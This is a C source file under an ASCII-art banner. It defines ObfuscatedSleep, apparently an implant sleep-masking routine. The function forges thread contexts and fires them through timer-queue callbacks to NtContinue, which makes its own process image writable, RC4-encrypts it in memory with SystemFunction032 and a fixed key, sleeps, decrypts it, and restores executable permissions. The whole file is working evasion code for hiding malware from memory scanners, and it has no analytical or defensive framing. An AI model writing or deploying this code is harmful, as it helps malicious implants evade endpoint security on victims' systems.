// .s5SSSs.                                         .s5SSs.  .s5SSSSs.                                   
//       SS. .s5SSSs.  .s5SSSs. .s    s.  .s5SSSs.       SS.    SSS    s.  .s5ssSs.  .s5SSSs.  .s5SSSs.  
// sS    S%S       SS.                SS.       SS. sS   S%S    S%S    SS.    SS SS.       SS.       SS. 
// SS    S%S sS    S%S sS       sS    S%S sS    `:; SS   S%S    S%S    S%S sS SS S%S sS    `:; sS    S%S 
// SS    S%S SS .sSSS  SSSs.    SS    S%S `:;;;;.   SS   S%S    S%S    S%S SS :; S%S SSSs.     SS .sS;:' 
// SS    S%S SS    S%S SS       SS    S%S       ;;. SS   S%S    S%S    S%S SS    S%S SS        SS    ;,  
// SS    `:; SS    `:; SS       SS    `:;       `:; SS   `:;    `:;    `:; SS    `:; SS        SS    `:; 
// SS    ;,. SS    ;,. SS       SS    ;,. .,;   ;,. SS  `;,.    ;,.    ;,. SS    ;,. SS    ;,. SS    ;,. 
// `:;;;;;:' `:;;;;;:' :;       `:;;;;;:' `:;;;;;:' `:;;;;;;    ;:'    ;:' :;    ;:' `:;;;;;:' `:    ;:' 
                    
#include "nt_helpers.h"
#include "timer_sleep.h"

VOID ObfuscatedSleep(DWORD dwSleepMillis)
{
    CONTEXT ctxCapture = { 0 };
    CONTEXT ctxRw      = { 0 };
    CONTEXT ctxEnc     = { 0 };
    CONTEXT ctxDelay   = { 0 };
    CONTEXT ctxDec     = { 0 };
    CONTEXT ctxRx      = { 0 };
    CONTEXT ctxEvent   = { 0 };

    HANDLE  hTimerQueue = NULL;
    HANDLE  hNewTimer   = NULL;
    HANDLE  hEvent      = NULL;
    PVOID   pImageBase  = NULL;
    DWORD   dwImageSize = 0;
    DWORD   dwOldProtect = 0;
    CHAR    keyBuf[16]  = { 0x55,0x55,0x55,0x55,0x55,0x55,0x55,0x55,
                            0x55,0x55,0x55,0x55,0x55,0x55,0x55,0x55 };
    USTRING key         = { 0 };
    USTRING img         = { 0 };
    PVOID   pNtContinue = NULL;
    PVOID   pSysFunc032 = NULL;

    hEvent      = CreateEventW(NULL, FALSE, FALSE, NULL);
    hTimerQueue = CreateTimerQueue();
    pNtContinue = GetProcAddress(GetModuleHandleA("ntdll"), "NtContinue");
    pSysFunc032 = GetProcAddress(LoadLibraryA("advapi32"), "SystemFunction032");
    pImageBase  = GetModuleHandleA(NULL);
    
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)pImageBase;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((PBYTE)pImageBase + dosHeader->e_lfanew);
    dwImageSize = ntHeaders->OptionalHeader.SizeOfImage;

    key.Buffer  = keyBuf;
    key.Length = key.MaximumLength = sizeof(keyBuf);
    img.Buffer  = pImageBase;
    img.Length = img.MaximumLength = dwImageSize;

    if (CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)RtlCaptureContext, 
                             &ctxCapture, 0, 0, WT_EXECUTEINTIMERTHREAD)) 
    {
        WaitForSingleObject(hEvent, 50);

        memcpy(&ctxRw,    &ctxCapture, sizeof(CONTEXT));
        memcpy(&ctxEnc,   &ctxCapture, sizeof(CONTEXT));
        memcpy(&ctxDelay, &ctxCapture, sizeof(CONTEXT));
        memcpy(&ctxDec,   &ctxCapture, sizeof(CONTEXT));
        memcpy(&ctxRx,    &ctxCapture, sizeof(CONTEXT));
        memcpy(&ctxEvent, &ctxCapture, sizeof(CONTEXT));

        ctxRw.Rsp    -= 8;
        ctxRw.Rip     = (DWORD64)VirtualProtect;
        ctxRw.Rcx     = (DWORD64)pImageBase;
        ctxRw.Rdx     = (DWORD64)dwImageSize;
        ctxRw.R8      = PAGE_READWRITE;
        ctxRw.R9      = (DWORD64)&dwOldProtect;

        ctxEnc.Rsp   -= 8;
        ctxEnc.Rip    = (DWORD64)pSysFunc032;
        ctxEnc.Rcx    = (DWORD64)&img;
        ctxEnc.Rdx    = (DWORD64)&key;

        ctxDelay.Rsp -= 8;
        ctxDelay.Rip  = (DWORD64)WaitForSingleObject;
        ctxDelay.Rcx  = (DWORD64)NtCurrentProcess();
        ctxDelay.Rdx  = (DWORD64)dwSleepMillis;

        ctxDec.Rsp   -= 8;
        ctxDec.Rip    = (DWORD64)pSysFunc032;
        ctxDec.Rcx    = (DWORD64)&img;
        ctxDec.Rdx    = (DWORD64)&key;

        ctxRx.Rsp    -= 8;
        ctxRx.Rip     = (DWORD64)VirtualProtect;
        ctxRx.Rcx     = (DWORD64)pImageBase;
        ctxRx.Rdx     = (DWORD64)dwImageSize;
        ctxRx.R8      = PAGE_EXECUTE_READWRITE;
        ctxRx.R9      = (DWORD64)&dwOldProtect;

        ctxEvent.Rsp -= 8;
        ctxEvent.Rip  = (DWORD64)SetEvent;
        ctxEvent.Rcx  = (DWORD64)hEvent;

        CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)pNtContinue, 
                             &ctxRw,    100, 0, WT_EXECUTEINTIMERTHREAD);
        CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)pNtContinue, 
                             &ctxEnc,   200, 0, WT_EXECUTEINTIMERTHREAD);
        CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)pNtContinue, 
                             &ctxDelay, 300, 0, WT_EXECUTEINTIMERTHREAD);
        CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)pNtContinue, 
                             &ctxDec,   400, 0, WT_EXECUTEINTIMERTHREAD);
        CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)pNtContinue, 
                             &ctxRx,    500, 0, WT_EXECUTEINTIMERTHREAD);
        CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)pNtContinue, 
                             &ctxEvent, 600, 0, WT_EXECUTEINTIMERTHREAD);

        WaitForSingleObject(hEvent, INFINITE);
    }

    if (hTimerQueue) DeleteTimerQueue(hTimerQueue);
    if (hEvent) CloseHandle(hEvent);
}